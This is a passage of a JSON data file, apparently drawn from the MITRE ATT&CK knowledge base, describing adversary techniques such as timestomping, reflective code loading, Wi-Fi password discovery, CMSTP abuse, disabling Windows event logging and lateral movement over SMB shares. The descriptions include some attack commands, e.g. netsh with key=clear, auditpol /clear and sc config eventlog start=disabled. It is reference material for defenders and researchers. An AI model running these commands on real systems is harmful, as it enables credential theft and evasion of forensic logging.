      "can timestomp any files or payloads placed on a target machine to help them blend in.",
      "can use the touch -t command to change timestamps.",
      "modifies the MAC times of its local log files to match that of the victim's desktop.ini file.",
      "can timestomp files on victims using a Web shell.",
      "performs timestomping of a CAB file it creates.",
      "has modified data timestamps to mimic files that are in the same folder on a compromised host.",
      "has used scheduled task raw XML with a backdated timestamp of June 2 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally  has used a random value to modify the timestamp of the file storing the clientID.",
      "has manipulated timestamps for creation or compilation dates to defeat anti-forensics.",
      "time-stomped its DLL in order to evade detection.",
      "has changed the creation date of files.",
      "has modified file and directory timestamps.",
      "has the capability to create and modify file timestamps.",
      "can modify timestamps of replaced files such as ssh with the added credential stealer or sshd used to deploy .",
      "has the ability to timestomp a file.",
      "has used timestomping to alter the Standard Information timestamps on their web shells to match other files in the same directory.",
      "has manipulated the time of last access to files and registry keys after they have been created or modified.",
      "During the   modified timestamps of backdoors to match legitimate Windows files.",
      "server component can change the timestamp of files.",
      "samples were timestomped by the authors by setting the PE timestamps to all zero values.  also has a built-in command to modify file times.",
      "has the ability to perform timestomping of files on targeted systems.",
      "can set the timestamps for its worker and service components to match that of cmd.exe.",
      "During the  campaign  used timestomping to modify the $STANDARD_INFORMATION attribute on tools.",
      "has used a Windows version of the Linux touch command to modify the date and time stamp on DLLs.",
      "After creating a new service for persistence  sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.",
      "Several  malware families use timestomping including modifying the last write timestamp of a specified Registry key to a random date as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.",
      "has a command to set certain attributes such as creation/modification timestamps on files.",
      "modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.",
      "has a command to conduct timestomping by setting a specified files timestamps to match those of a system file in the System32 directory.",
      "can change or create the last access or write times.",
      "Many  samples were programmed using Borland Delphi which will mangle the default PE compile timestamp of a file.",
      "can change the modified time for files to evade forensic detection.",
      "can change the `CreationTime` `LastAccessTime` and `LastWriteTime` file time attributes when executed with `SYSTEM` privileges.",
      "can timestomp any files or payloads placed on a target machine to help them blend in.",
      "has changed the time stamp of certain files.",
      "uses the `utimes()` function to change the executable's timestamp.",
      "changes timestamps of overwritten files to either 1601.1.1 for NTFS filesystems or 1980.1.1 for all other filesystems.",
      "can time stomp its executable previously dating it between 2010 to 2021.",
      "can timestomp files for defense evasion and anti-forensics purposes.",
      "restores timestamps to original values following modification."
    ],
    "description": "Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.In Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet Forensics)Modifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.(Citation: Inversecos Timestomping 2022)Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in double timestomping by modifying times on both attributes simultaneously.(Citation: Double Timestomping)In Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as `touch -a -m -t <timestamp> <filename>` (which sets access and modification times to a specific value) or `touch -r <filename> <filename>` (which sets access and modification times to match those of another file).(Citation: Inversecos Linux Timestomping)(Citation: Juniper Networks ESXi Backdoor 2022)Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)",
    "similar_words": [
      "Timestomp"
    ],
    "id": "T1070.006"
  },
  "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a": {
    "name": "Reflective Code Loading",
    "example_uses": [
      "can copy a large byte array of 64-bit shellcode into process memory and execute it with a call to `CreateThread`.",
      "downloader can reverse its third stage file bytes and reflectively load the file as a .NET assembly.",
      "has the ability to load new modules directly into memory using its `Load Modules Mem` command.",
      "reflectively loads a Windows PE file into a process.",
      "has reflectively loaded the decoded DLL into memory.",
      "can use custom shellcode to map embedded DLLs into memory.",
      "has reflectively loaded a DLL to read decrypt and load an orchestrator file.",
      "has changed memory protection permissions then overwritten in memory DLL function code with shellcode which was later executed via  hijacking.  has also used shellcode within macros to decrypt and manually map DLLs into memory at runtime.",
      "loaded the payload into memory using PowerShell.",
      "execute-assembly command can run a .NET executable within the memory of a sacrificial process by loading the CLR.",
      "has used reflective loading to execute malicious DLLs.",
      "can use reflective code loading to load .NET assemblies into `MSExchangeOWAAppPool` on targeted Exchange servers.",
      "can generate code modules that enable in-memory execution of VBScript JScript EXE DLL and dotNET payloads.",
      "has reflectively loaded payloads into memory.",
      "has a plugin system that can load specially made DLLs into memory and execute their functions.",
      "uses various API functions such as NSCreateObjectFileImageFromMemory to load and link in-memory payloads.",
      "loader has reflectively loaded .NET-based assembly/payloads into memory.",
      "can run a .NET executable within the memory of a sacrificial process by loading the CLR.",
      "has used the Invoke-Mimikatz PowerShell script to reflectively load a Mimikatz credential stealing DLL into memory.",
      "reflectively loads stored previously encrypted components of the PE file into memory of the currently executing process to avoid writing content to disk on the executing machine.",
      "can use reflective loading to decrypt and run malicious executables in a new thread.",
      "has used reflective loading techniques to load content into memory during execution."
    ],
    "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the injection loads code into the processes own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
    "similar_words": [
      "Reflective Code Loading"
    ],
    "id": "T1620"
  },
  "attack-pattern--494ab9f0-36e0-4b06-b10d-57285b040a06": {
    "name": "Wi-Fi Discovery",
    "example_uses": [
      "has collected names and passwords of all Wi-Fi networks to which a device has previously connected.",
      "can collect names and passwords of all Wi-Fi networks to which a device has previously connected.",
      "can extract names of all locally reachable Wi-Fi networks and then perform a brute-force attack to spread to new networks.",
      "During   collected information on wireless interfaces within range of a compromised system."
    ],
    "description": "Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile Wi-Fi name key=clear` to show a Wi-Fi networks corresponding password.(Citation: BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35 CharmPower January 2022) Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary Defense Emotes Wi-Fi Spreader)On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password on Mac)",
    "similar_words": [
      "Wi-Fi Discovery"
    ],
    "id": "T1016.002"
  },
  "attack-pattern--4a2975db-414e-4c0c-bd92-775987514b4b": {
    "name": "Ignore Process Interrupts",
    "example_uses": [
      "The  Linux variant has been executed with the `nohup` command to ignore hangup signals and continue to run if the terminal session was terminated.",
      "has used the `nohup` command to instruct executed payloads to ignore hangup signals.",
      "set's it's process to ignore the following signals; `SIGHUP` `SIGINT` `SIGQUIT` `SIGPIPE` `SIGCHLD` `SIGTTIN` and `SIGTTOU`.",
      "calls the signal function to ignore the signals SIGCHLD SIGHIP and SIGPIPE prior to starting primary logic.",
      "executed  using the tool NoHup which keeps the malware running on a system after exiting the shell or terminal."
    ],
    "description": "Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.(Citation: Linux Signal Man)  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. Adversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue) This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.Hiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.",
    "similar_words": [
      "Ignore Process Interrupts"
    ],
    "id": "T1564.011"
  },
  "attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665": {
    "name": "Escape to Host",
    "example_uses": [
      "can gain a reverse shell on a host node by mounting the Kubernetes hostPath.",
      "s container was configured to bind the host root directory.",
      "maps the hosts C drive to the container by creating a global symbolic link to the host through the calling of NtSetInformationSymbolicLink.",
      "has deployed privileged containers that mount the filesystem of victim machine.",
      "has used the BOtB tool that can break out of containers."
    ],
    "description": "Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)There are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the hosts filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)In ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor.(Citation: Broadcom VMSA-2025-004)Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.",
    "similar_words": [
      "Escape to Host"
    ],
    "id": "T1611"
  },
  "attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179": {
    "name": "Shortcut Modification",
    "example_uses": [
      "establishes persistence by creating a shortcut (.LNK file) in the Windows startup folder to run a script each time the user logs in.",
      "attempts to add a shortcut file in the Startup folder to achieve persistence.",
      "can establish persistence by creating a .lnk shortcut to itself in the Startup folder.",
      "creates a shortcut file and saves it in a Startup folder to establish persistence.",
      "can write or modify browser shortcuts to enable launching of malicious browser extensions.",
      "has modified LNK shortcuts.",
      "establishes persistence by creating a shortcut.",
      "can modify the shortcut that launches Telegram by replacing its path with the malicious payload to launch with the legitimate executable.",
      "creates a shortcut to maintain persistence.",
      "has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.",
      "To establish persistence  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an Office Start Yahoo Talk MSN Gaming Z0ne or MSN Talk shortcut.",
      "malware has maintained persistence on a system by creating a LNK shortcut in the users Startup folder.",
      "establishes persistence via a .lnk file in the victims startup path.",
      "can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.",
      "The  3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.",
      "achieves persistence by creating a shortcut in the current user's Startup folder.",
      "can create a shortcut in the Windows startup folder for persistence.",
      "initial payload is a malicious .LNK file.",
      "may create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk which points to the malicious `msdtc.exe` file already created in the `%CommonFiles%` directory.",
      "achieves persistence by creating a shortcut in the Startup folder.",
      "malware can create a .lnk file and add a Registry Run key to establish persistence.",
      "achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.",
      "is capable of persisting via a .lnk file stored in the Startup directory.",
      "can use a .lnk shortcut for the Control Panel to establish persistence.",
      "creates a .LNK file for persistence.",
      "A version of  drops a Windows shortcut on the victims machine to establish persistence.",
      "can establish persistence by writing shortcuts to the Windows Startup folder.",
      "can persist by modifying a .LNK file to include a backdoor.",
      "adds a .lnk file to the Windows startup folder."
    ],
    "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",
    "similar_words": [
      "Shortcut Modification"
    ],
    "id": "T1547.009"
  },
  "attack-pattern--4bc31b94-045b-4752-8920-aebaebdb6470": {
    "name": "Email Account",
    "example_uses": [
      "has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.",
      "has used Powershell to discover email accounts.",
      "can parse Outlook .pst files to extract e-mail addresses.",
      "used malware to enumerate email settings including usernames and passwords from the M.E.Doc application.",
      "During   accessed Azure AD to identify email addresses.",
      "collects address book information from Outlook.",
      "collects email addresses from Outlook.",
      "can collect email accounts from Microsoft Outlook and Mozilla Thunderbird.",
      "can be used to enumerate Exchange users and dump the GAL.",
      "can be used to obtain account names from Exchange and Office 365 using the Get-GlobalAddressList cmdlet.",
      "has been observed leveraging a module that can scrape email addresses from Outlook.",
      "can execute an LDAP query to discover e-mail accounts for domain users.",
      "has collected information about email accounts.",
      "During  threat actors used compromised Exchange accounts to search mailboxes for administrator accounts."
    ],
    "description": "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)In on-premises Exchange and Exchange Online, the Get-GlobalAddressList PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)",
    "similar_words": [
      "Email Account"
    ],
    "id": "T1087.003"
  },
  "attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0": {
    "name": "Time Based Evasion",
    "example_uses": [
      "After initial installation  runs a computation to delay execution.",
      "has the ability to sleep for a specified time to evade detection.",
      "remained dormant after initial access for a period of up to two weeks.",
      "can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call.",
      "can perform a long sleep (greater than or equal to 3 minutes) to evade detection.",
      "has used the sleep command to avoid sandbox detection.",
      "has the ability to put itself to sleep for a specified time.",
      "can wait 30 minutes before initiating contact with C2.",
      "has used a 30 minute delay after execution to evade sandbox monitoring tools.",
      "loader can detect presence of an emulator by using two calls to GetTickCount API and checking whether the time has been accelerated.",
      "can turn itself on or off at random intervals.",
      "can implement the `kernel32.dll` Sleep function to delay execution for up to 300 seconds before implementing persistence or processing an addon package.",
      "has the ability to set a hardcoded and randomized sleep interval.",
      "can determine when it has been installed on a host for at least 15 days before downloading the final payload.",
      "has used the command `timeout 20` to pause the execution of its initial loader.",
      "During   used tools that collected `GetTickCount` and `GetSystemTimeAsFileTime` data to detect sandbox or VMware services.",
      "has the ability to sleep for at least nine minutes to evade sandbox-based analysis systems.",
      "has the ability to receive a command parameter to sleep prior to carrying out destructive actions on a targeted host.",
      "has performed a time-based anti-debug check before downloading its third stage.",
      "can execute `WScript.Sleep` to delay execution of its second stage.",
      "has checked if the malware is running in a virtual environment with the anti-debug function GetTickCount() to compare the timing.",
      "can modify its sleep time responses from the default of 20-22 seconds.",
      "has delayed execution using a built-in function to avoid detection and analysis.",
      "has used printf and file I/O loops to delay process execution as part of API hammering.",
      "has delayed execution for five to six minutes during its persistence establishment process.",
      "The  dropper can delay dropping the payload to evade detection.",
      "can wait 30 seconds before executing additional code if security software is detected.",
      "can sleep for 195 - 205 seconds after payload execution and before deleting its task.",
      "can use a timer to delay execution of core functionality.",
      "has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.",
      "has delayed communication to the actor-controlled IP address by 5 minutes.",
      "installer has delayed installation of  for two hours after it reaches a victim system.",
      "can pause for 20 seconds to bypass antivirus solutions.",
      "can use the `GetTickCount` and `GetSystemTimeAsFileTime` API calls to measure function timing.  can also remotely shut down into sleep mode under specific conditions to evade detection.",
      "has set an execution trigger date and time stored as an ASCII Unix/Epoch time value.",
      "has the ability to perform anti-debugging based on time checks API calls and CPUID.",
      "can enter a sleep stage for 30 minutes to evade detection.",
      "can call `NtDelayExecution` to pause execution.",
      "Using the machine's local time  waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file .report. After the elapsed time  executes additional modules.",
      "invokes time call to check the system's time executes a sleep command invokes a second time call and then compares the time difference between the two time calls and the amount of time the system slept to identify the sandbox.",
      "has waited a specified time before downloading a second stage payload.",
      "can pause for a number of hours before entering its C2 communication loop.",
      "can designate a sleep period of more than 22 seconds between stages of infection.",
      "will sleep for a random number of seconds iterating 200 times over sleeps between one to three seconds before continuing execution flow.",
      "can sleep for a set number of minutes before beginning execution."
    ],
    "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)",
    "similar_words": [
      "Time Based Evasion"
    ],
    "id": "T1497.003"
  },
  "attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49": {
    "name": "CMSTP",
    "example_uses": [
      "has used CMSTP.exe and a malicious INF to execute its  payload.",
      "has used the command cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.",
      "can use CMSTP.exe to install a malicious Microsoft Connection Manager Profile.",
      "can attempt a CMSTP UAC bypass if it does not have administrative privileges."
    ],
    "description": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / Squiblydoo, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",
    "similar_words": [
      "CMSTP"
    ],
    "id": "T1218.003"
  },
  "attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8": {
    "name": "SSH Hijacking",
    "example_uses": [],
    "description": "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
    "similar_words": [
      "SSH Hijacking"
    ],
    "id": "T1563.001"
  },
  "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a": {
    "name": "Disable Windows Event Logging",
    "example_uses": [
      "can be used to disable specific event logs on the system.",
      "has used appcmd.exe to disable logging on a victim server.",
      "has executed scripts to disable the event log service.",
      "During the   used `AUDITPOL` to prevent the collection of audit logs.",
      "During the   disabled event logging on compromised systems.",
      "During  threat actors deleted Windows events and application logs."
    ],
    "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to Security Settings\\Local Policies\\Audit Policy for basic audit policy settings or Security Settings\\Advanced Audit Policy Configuration for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) auditpol.exe may also be used to set audit policies.(Citation: auditpol)Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the Set-Service -Name EventLog -Status Stopped or sc config eventlog start=disabled commands (followed by manually stopping the service using Stop-Service  -Name EventLog).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the Start value in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System and HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application to disable the entire EventLog.(Citation: disable_win_evt_logging)Additionally, adversaries may use auditpol and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the /success or /failure parameters. For example, auditpol /set /category:Account Logon /success:disable /failure:disable turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: auditpol /clear /y or auditpol /remove /allusers.(Citation: T1562.002_redcanaryco)By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
    "similar_words": [
      "Disable Windows Event Logging"
    ],
    "id": "T1562.002"
  },
  "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541": {
    "name": "SMB/Windows Admin Shares",
    "example_uses": [
      "can spread via SMB and encrypts files on different hosts potentially compromising an entire network.",
      "has used batch scripts that can enable SMB on a compromised host.",
      "actors mapped network drives using net use.",
      "can use a list of hardcoded credentials to to authenticate via NTLMSSP to the SMB shares on remote systems.",
      "has leveraged the Admin$ C$ and IPC$ shares for lateral movement.",
      "has been copied over network shares to move laterally.",
      "has used the C$ network share for lateral movement.",
      "a tool that has been used by adversaries writes programs to the ADMIN$ network share to execute commands on remote systems.",
      "has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement.",
      "accesses network share(s) enables share access to the target device copies an executable payload to the target system and uses a  to execute the malware.",
      "has transferred implant files using Windows Admin Shares.",
      "can use SMB to connect to move laterally.",
      "actors have been known to copy files to the network shares of other computers to move laterally.",
      "can use  which interacts with the ADMIN$ network share to execute commands on remote systems.",
      "used net use commands to connect to lateral systems within a network.",
      "can spread throughout a network via SMB prior to encryption.",
      "has run a plug-in on a victim to spread through the local network by using  and accessing admin shares.",
      "During the   used administrative accounts to connect over SMB to targeted users.",
      "has leveraged SMB to move laterally within a compromised network via application servers and SQL servers.",
      "has used Windows admin shares to move laterally.",
      "has used valid accounts to access SMB shares.",
      "has the ability to use SMB to pivot in compromised networks.",
      "has the ability to use SMB for communication.",
      "variants spread through NetBIOS share propagation.",
      "has copied payloads to the `ADMIN$` share of remote systems and run net use to connect to network shares.",
      "During  threat actors used 's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.",
      "Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
      "copies itself over network shares to move laterally on a victim network.",
      "has used locally mounted network shares for lateral movement through targated environments.",
      "will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.",
      "Lateral movement can be done with  through net use commands to connect to the on remote systems.",
      "has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.  has also used smbexec from the  suite for lateral movement.",
      "During  threat actors moved laterally using compromised credentials to connect to internal Windows systems with SMB.",
      "The  malware platform can use Windows admin shares to move laterally.",
      "has used Windows Explorer to manually copy malicious files to remote hosts over SMB.",
      "used  to use Windows' hidden network shares to copy their tools to remote machines for execution.",
      "propagates to available network shares.",
      "has used SMBexec for lateral movement.",
      "can use Window admin shares (C$ and ADMIN$) for lateral movement.",
      "uses  to interact with the ADMIN$ network share to execute commands on remote systems.",
      "has copied its backdoor across open network shares including ADMIN$ C$WINDOWS D$WINDOWS and E$WINDOWS.",
      "malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.",
      "uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.",
      "can infect victims by brute forcing SMB.",
      "During the   utilized `net use` to connect to network shares.",
      "uses net.exe to connect to network shares using net use commands with compromised credentials.",
      "can support windows execution via SMB shares.",
      "has used SMB for lateral movement.",
      "has mapped network drives using  and administrator credentials.",
      "used remote shares to enable lateral movement in victim environments.",
      "has transferred implant files using Windows Admin Shares and the Server Message Block (SMB) protocol then executes files through Windows Management Instrumentation (WMI).",
      "has used  to move laterally via SMB.",
      "During  threat actors used SMB for lateral movement.",
      "used remote shares to move laterally through victim networks during .",
      "can use credentials provided in its configuration to move laterally from the infected machine over SMBv2.",
      "During  threat actors used SMB to pivot internally in victim networks.",
      "has the ability to move laterally via SMB.",
